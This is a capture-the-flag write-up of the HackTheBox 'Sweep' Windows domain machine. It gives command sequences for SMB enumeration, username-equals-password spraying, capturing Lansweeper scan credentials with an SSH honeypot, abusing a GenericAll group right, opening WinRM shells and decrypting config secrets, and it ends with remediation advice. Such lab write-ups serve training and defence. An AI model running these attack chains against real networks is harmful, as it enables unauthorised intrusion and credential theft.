# HackTheBox - Sweep Writeup

**Machine:** Sweep  
**IP Address:** 10.129.234.177  
**Difficulty:** Medium
**OS:** Windows (AD)

---

## Table of Contents

- [Reconnaissance](#reconnaissance)
- [Initial Access](#initial-access)
- [Privilege Escalation - User](#privilege-escalation---user)
- [Privilege Escalation - Root](#privilege-escalation---root)
- [Key Takeaways](#key-takeaways)
- [Tools Used](#tools-used)
- [Flags](#flags)
- [Remediation Recommendations](#remediation-recommendations)

---

## Reconnaissance

### Target Details

- Host: `INVENTORY.sweep.vl`, `sweep.vl`

### SMB Enumeration

```bash
nxc smb 10.129.234.177 -u '' -p '' --generate-hosts-file /etc/hosts
smbmap -H 10.129.234.177 -d 'sweep.vl' -u 'guest' -p ''
```

Shares of interest:

- `Lansweeper$`
- `DefaultPackageShare$`

Accessed `DefaultPackageShare$`:

```bash
smbclient //10.129.234.177/DefaultPackageShare$ -N
```

Found VBS scripts:

- `Wallpaper.vbs`
- `CopyFile.vbs`
- `CmpDesc.vbs`

RID brute and username list:

```bash
nxc smb 10.129.234.177 -u guest -p '' --rid-brute | grep SidTypeUser | cut -d'\' -f2 | cut -d' ' -f1 > users.txt
```

---

## Initial Access

### Username=Password Spray

```bash
nxc smb 10.129.234.177 -u 'users.txt' -p 'users.txt' --continue-on-success --no-brute
```

**Valid Credentials:**

- `intern / intern`

### Lansweeper Access

```bash
smbmap -H 10.129.234.177 -d 'sweep.vl' -u 'intern' -p 'intern'
```

Web UI:

```
http://inventory.sweep.vl:81
```

Logged into Lansweeper with `intern:intern`.

Configured a scan target using our VPN IP, SSH on port 2022, and linked all credentials under **Map Credential**.

---

## Privilege Escalation - User

### Credential Capture with sshesame

Installed sshesame:

```bash
apt install sshesame
wget -qO sshesame.conf https://github.com/jaksi/sshesame/raw/master/sshesame.yaml
```

Edited config and removed line 37 (`split_host_port: false`) due to a parsing bug.

Ran honeypot:

```bash
sshesame --config sshesame.conf
```

Captured credentials when Lansweeper scanned:

- `svc_inventory_lnx / 0|5m-U6?/uAX`

Validated:

```bash
nxc smb inventory.sweep.vl -u svc_inventory_lnx -p '0|5m-U6?/uAX'
```

### BloodHound Findings

```bash
bloodhound-python -u 'svc_inventory_lnx' -p '0|5m-U6?/uAX' -d 'sweep.vl' -c All -ns 10.129.234.177 --dns-tcp --zip
```

- `svc_inventory_lnx` ∈ `Lansweeper Discovery`.
- `Lansweeper Discovery` has `GenericAll` on `Lansweeper Admins`.
- `Lansweeper Admins` ∈ `Remote Management Users`.

Added account to `Lansweeper Admins`:

```bash
bloodyAD --host inventory.sweep.vl -d sweep.vl -u svc_inventory_lnx -p '0|5m-U6?/uAX' add groupMember "Lansweeper Admins" svc_inventory_lnx
```

WinRM shell:

```bash
evil-winrm -i inventory.sweep.vl -u svc_inventory_lnx -p '0|5m-U6?/uAX'
```

User flag:

```cmd
type C:\user.txt
```

---

## Privilege Escalation - Root

### Lansweeper Config Decryption

Located encrypted `web.config`:

```powershell
cd 'C:\Program Files (x86)\Lansweeper'
cat Website\web.config
```

Used SharpLansweeperDecrypt:

```bash
git clone https://github.com/Yeeb1/SharpLansweeperDecrypt.git
```

Uploaded and ran:

```powershell
cd C:\Windows\Tasks
upload LansweeperDecrypt.ps1
.\LansweeperDecrypt.ps1
```

Recovered:

- `svc_inventory_win / 4^56!sK&}eA?`

WinRM as admin:

```bash
evil-winrm -i inventory.sweep.vl -u svc_inventory_win -p '4^56!sK&}eA?'
```

Root flag:

```cmd
type C:\Users\Administrator\Desktop\root.txt
```

---

## Key Takeaways

1. Guest SMB and RID brute force enabled user enumeration.
2. Weak creds (intern:intern) opened Lansweeper access.
3. Lansweeper scan credentials were captured via SSH honeypot.
4. AD group misdelegation allowed WinRM access.
5. Decryptable config secrets exposed admin credentials.

---

## Tools Used

- nxc
- smbmap / smbclient
- Lansweeper
- sshesame
- bloodhound-python
- bloodyAD
- evil-winrm
- SharpLansweeperDecrypt

---

## Flags

**User Flag:** `C:\user.txt` (value not recorded in PDF)  
**Root Flag:** `C:\Users\Administrator\Desktop\root.txt` (value not recorded in PDF)

---

## Remediation Recommendations

### Critical Severity

1. **Disable SMB Guest Access**

   - **Issue:** Guest SMB allowed share enumeration.
   - **Impact:** User discovery and foothold.
   - **Remediation:**
     - Disable guest access and enforce authentication.

2. **Secure Lansweeper Scan Credentials**

   - **Issue:** Map credentials were exposed and reusable.
   - **Impact:** Credential capture and domain access.
   - **Remediation:**
     - Use privileged access management and rotate credentials.

### High Severity

3. **Fix AD Group Misdelegation**

   - **Issue:** `Lansweeper Discovery` had `GenericAll` over `Lansweeper Admins`.
   - **Impact:** Privilege escalation to WinRM.
   - **Remediation:**
     - Audit and reduce ACLs on privileged groups.

4. **Protect Secrets in web.config**

   - **Issue:** Encrypted values were decryptable with public tools.
   - **Impact:** Admin credential disclosure.
   - **Remediation:**
     - Store secrets in a vault and enforce DPAPI with machine scoping.
